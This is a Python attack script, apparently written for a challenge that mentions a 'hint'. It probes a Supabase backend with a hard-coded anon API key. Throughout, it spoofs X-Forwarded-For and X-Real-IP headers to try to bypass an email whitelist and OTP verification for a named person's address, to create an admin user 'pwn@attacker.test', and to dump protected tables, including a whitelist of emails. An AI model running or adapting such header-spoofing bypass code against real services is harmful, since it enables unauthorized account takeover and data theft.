import urllib.request, urllib.error, ssl, json

BASE = "https://iuqrarlmvuydxhiygkro.supabase.co"
ANON = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml1cXJhcmxtdnV5ZHhoaXlna3JvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzAzODI2NzUsImV4cCI6MjA4NTk1ODY3NX0.DCWPItRMC2aekqWjFoTGoROzzmR_q2uy2NjJK-nAxLg"
ctx = ssl.create_default_context()

def req(method, path, body=None, token=None, extra=None):
    url = f"{BASE}{path}"
    data = json.dumps(body).encode() if body else None
    h = {"apikey": ANON, "Authorization": f"Bearer {token or ANON}", "Content-Type": "application/json", "Accept": "application/json"}
    if extra: h.update(extra)
    r = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        resp = urllib.request.urlopen(r, timeout=20, context=ctx)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return "ERR", str(e)

# The hint says two headers. Most common internal-trust bypass combos:
ip = "127.0.0.1"
header_combos = [
    {"X-Forwarded-For": ip, "X-Real-IP": ip},
    {"X-Forwarded-For": "10.44.7.21", "X-Real-IP": "10.44.7.21"},
    {"X-Forwarded-For": "172.18.4.37", "X-Real-IP": "172.18.4.37"},
]

# Try custom-otp bypass with internal headers (skip whitelist)
print("=== custom-otp with internal headers ===")
for combo in header_combos:
    s, o = req("POST", "/functions/v1/custom-otp", {"email": "test@attacker.test"}, extra=combo)
    mark = "<<< DIFFERENT" if "guest list" not in o else ""
    print(f"  {combo} -> {s} {o[:120]} {mark}")

# Try verify-otp with internal headers (skip code check?)
print("\n=== verify-otp with internal headers ===")
for combo in header_combos:
    s, o = req("POST", "/functions/v1/verify-otp", {"email": "d.vitali@reply.it", "code": "000000"}, extra=combo)
    mark = "<<< DIFFERENT" if "Invalid" not in o and "expired" not in o else ""
    print(f"  {combo} -> {s} {o[:160]} {mark}")

# Try admin-add-user with internal headers
print("\n=== admin-add-user with internal headers ===")
for combo in header_combos:
    s, o = req("POST", "/functions/v1/admin-add-user", {"email": "pwn@attacker.test"}, extra=combo)
    mark = "<<< DIFFERENT" if "Forbidden" not in o and "Unauthorized" not in o else ""
    print(f"  {combo} -> {s} {o[:160]} {mark}")

# Try reading tables with internal headers (anon)
print("\n=== chapters table with internal headers ===")
for combo in header_combos:
    s, o = req("GET", "/rest/v1/chapters?select=*", extra=combo)
    mark = "<<< HAS DATA" if o.strip() not in ("[]", "") else ""
    print(f"  {combo} -> {s} {o[:200]} {mark}")

print("\n=== chapter_content with internal headers ===")
for combo in header_combos:
    s, o = req("GET", "/rest/v1/chapter_content?select=*", extra=combo)
    mark = "<<< HAS DATA" if o.strip() not in ("[]", "") else ""
    print(f"  {combo} -> {s} {o[:200]} {mark}")

print("\n=== whitelisted_emails with internal headers ===")
for combo in header_combos:
    s, o = req("GET", "/rest/v1/whitelisted_emails?select=*", extra=combo)
    mark = "<<< HAS DATA" if o.strip() not in ("[]", "") else ""
    print(f"  {combo} -> {s} {o[:200]} {mark}")
